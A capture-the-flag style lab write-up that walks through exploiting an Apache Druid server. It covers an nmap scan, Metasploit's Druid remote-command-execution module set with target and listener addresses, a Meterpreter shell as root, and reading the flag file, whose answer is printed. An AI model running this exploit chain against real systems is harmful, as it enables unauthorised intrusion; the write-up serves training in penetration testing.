### Payloads Exercise
 
IP: 10.129.104.129
 
---
 
### Question 1:
Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
 
I start off by running an nmap scan, targeting all ports and trying to be thorough and quick.
 
```diff
+ $ sudo nmap -sT -A -p- 10.129.104.129
```
 
	22/tcp   open  ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	2181/tcp open  zookeeper Zookeeper 3.4.14-4c25d480e66aadd371de8bd2fd8da255ac140bcf (Built on 03/06/2019)
	8081/tcp open  http      Jetty 9.4.12.v20180830
	| http-title: Apache Druid
	|_Requested resource was http://10.129.104.129:8081/unified-console.html
	|_http-server-header: Jetty(9.4.12.v20180830)
	8082/tcp open  http      Jetty 9.4.12.v20180830
	|_http-title: Site doesn't have a title.
	|_http-server-header: Jetty(9.4.12.v20180830)
	8083/tcp open  http      Jetty 9.4.12.v20180830
	|_http-server-header: Jetty(9.4.12.v20180830)
	|_http-title: Site doesn't have a title.
	8091/tcp open  http      Jetty 9.4.12.v20180830
	|_http-server-header: Jetty(9.4.12.v20180830)
	|_http-title: Site doesn't have a title.
	8888/tcp open  http      Jetty 9.4.12.v20180830
	|_http-server-header: Jetty(9.4.12.v20180830)
	| http-title: Apache Druid
	|_Requested resource was http://10.129.104.129:8888/unified-console.html
 
From this I can see SSH, a Zookeeper service, and a Jetty web server running Apache Druid.
 
Since the question asks to exploit the Apache Druid service, I look for a Metasploit module on it.
 
```diff
+ [msf](Jobs:0 Agents:0) >> search apache druid
```
 
	Matching Modules
	================
	   #  Name                                            Disclosure Date  Rank       Check  Description
	   -  ----                                            ---------------  ----       -----  -----------
	   0  exploit/linux/http/apache_druid_js_rce          2021-01-21       excellent  Yes    Apache Druid 0.20.0 Remote Command Execution
 
```diff
+ [msf](Jobs:0 Agents:0) >> use 0
```
 
I then configure the options.
 
```diff
+ [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> setg RHOSTS 10.129.104.129
+ [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> setg LHOST 10.10.14.75
+ [msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
```
 
	RHOSTS => 10.129.104.129
	LHOST => 10.10.14.75
	(Meterpreter 1)(/root/druid) >
 
This gave me a shell. I see I'm a directory deep inside the root users home, so I `cd` up and look around.
 
```diff
+ (Meterpreter 1)(/root/druid) > cd ..
+ (Meterpreter 1)(/root) > ls
```
 
	Listing: /root
	==============
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100600/rw-------  168   fil   2022-05-16 07:07:41 -0400  .bash_history
	100644/rw-r--r--  3137  fil   2022-05-11 09:43:25 -0400  .bashrc
	040700/rwx------  4096  dir   2022-05-16 07:04:45 -0400  .cache
	040700/rwx------  4096  dir   2022-05-16 06:54:48 -0400  .config
	100644/rw-r--r--  161   fil   2019-12-05 09:39:21 -0500  .profile
	100644/rw-r--r--  75    fil   2022-05-16 04:45:33 -0400  .selected_editor
	040700/rwx------  4096  dir   2021-10-06 13:37:09 -0400  .ssh
	100644/rw-r--r--  212   fil   2022-05-11 10:10:43 -0400  .wget-hsts
	040755/rwxr-xr-x  4096  dir   2022-05-11 08:51:45 -0400  druid
	100755/rwxr-xr-x  95    fil   2022-05-16 06:31:10 -0400  druid.sh
	100644/rw-r--r--  22    fil   2022-05-16 06:01:15 -0400  flag.txt
	040755/rwxr-xr-x  4096  dir   2021-10-06 13:37:19 -0400  snap
 
```diff
+ (Meterpreter 1)(/root) > cat flag.txt
```
 
	HTB{MSF_Expl01t4t10n}
 
&#x1F6A9; found **HTB{MSF_Expl01t4t10n}**.
 

